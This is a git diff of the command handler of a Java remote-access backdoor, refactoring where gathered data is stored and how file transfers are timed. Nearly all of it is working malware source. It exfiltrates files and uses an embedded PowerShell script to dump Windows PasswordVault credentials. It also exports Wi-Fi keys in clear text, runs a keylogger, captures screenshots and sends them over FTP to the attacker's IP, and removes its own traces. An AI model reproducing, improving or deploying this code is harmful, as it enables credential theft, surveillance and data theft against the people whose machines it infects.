@@ -57,8 +57,7 @@ public class HandleCommand {
 			try {
 				Utils.exfilFiles(command.substring(command.indexOf(" "), command.indexOf("*")),
 						new ArrayList<String>(Arrays.asList(command.substring(command.indexOf("*") + 1).split(","))));
-				send = "Files exfiltrated to '" + System.getProperty("user.dir")
-						+ "\\gathered\\ExfiltratedFiles' on victim's computer";
+				send = "Files exfiltrated to '" + Backdoor.gatheredDir + "ExfiltratedFiles' on victim's computer";
 			} catch (Exception e) {
 				send = "An error occurred when trying to exfiltrate files";
 				if (e.getMessage() != null)
@@ -68,7 +67,7 @@ public class HandleCommand {
 			try {
 				File exfilBrowserCreds = new File("ExfilBrowserCreds.ps1");
 				PrintWriter out = new PrintWriter(exfilBrowserCreds);
-				out.println("$filename=$PSScriptRoot+\"\\gathered\\BrowserPasswords.txt\"\n"
+				out.println("$filename=$PSScriptRoot+\"" + Backdoor.gatheredDir + "BrowserPasswords.txt\"\n"
 						+ "[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\n"
 						+ "$creds = (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll()\n"
 						+ "foreach ($c in $creds) {$c.RetrievePassword()}\n"
@@ -78,8 +77,7 @@ public class HandleCommand {
 				out.flush();
 				out.close();
 				send += Utils.runPSScript(exfilBrowserCreds.getAbsolutePath()) + "\n";
-				send += Utils.runCommand(
-						"netsh wlan export profile key=clear folder=" + System.getProperty("user.dir") + "\\gathered");
+				send += Utils.runCommand("netsh wlan export profile key=clear folder=" + Backdoor.gatheredDir);
 				FileUtils.forceDelete(exfilBrowserCreds);
 			} catch (Exception e) {
 				send = "An error occurred when trying to exfiltrate passwords";
@@ -88,7 +86,6 @@ public class HandleCommand {
 			}
 		else if (command.startsWith("filesend") || command.startsWith("filerec"))
 			try {
-				Thread.sleep(2000);
 				if (command.startsWith("filesend")) {
 					FTP.backdoor(command.substring(9), "rec", Backdoor.ip);
 					send = "File sent";
@@ -96,6 +93,9 @@ public class HandleCommand {
 					FTP.backdoor(command.substring(8), "send", Backdoor.ip);
 					send = "File received";
 				}
+				while (!FTP.socketTransferDone)
+					Thread.sleep(10);
+				FTP.socketTransferDone = false;
 			} catch (Exception e) {
 				send = "An error occurred when trying to transfer file";
 				if (e.getMessage() != null)
@@ -108,16 +108,17 @@ public class HandleCommand {
 				}
 			};
 			keyLogger.start();
-			send = "Keys are being logged to '" + System.getProperty("user.dir")
-					+ "\\gathered\\keys.log' on victim's computer";
+			send = "Keys are being logged to '" + Backdoor.gatheredDir + "keys.log' on victim's computer";
 		} else if (command.equals("ss"))
 			try {
-				Thread.sleep(2000);
-				File screenshot = new File("screenshot.png");
+				File screenshot = new File(Backdoor.gatheredDir + "screenshot.png");
 				ImageIO.write(
 						new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())),
 						"png", screenshot);
-				FTP.backdoor("screenshot.png", "send", Backdoor.ip);
+				FTP.backdoor(screenshot.getAbsolutePath(), "send", Backdoor.ip);
+				while (!FTP.socketTransferDone)
+					Thread.sleep(10);
+				FTP.socketTransferDone = false;
 				FileUtils.forceDelete(screenshot);
 				send = "Screenshot received";
 			} catch (Exception e) {
@@ -151,8 +152,8 @@ public class HandleCommand {
 			}
 		else if (command.equals("remove"))
 			try {
-				Runtime.getRuntime()
-						.exec("cmd /c ping localhost -n 5 > nul && del /f /q run.jar run.bat && rd /s /q gathered jre");
+				Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && del /f /q run.jar run.bat && rd /s /q "
+						+ Backdoor.gatheredDir + " jre");
 				System.exit(0);
 			} catch (Exception e) {
 				send = "An error occurred when trying to remove files";
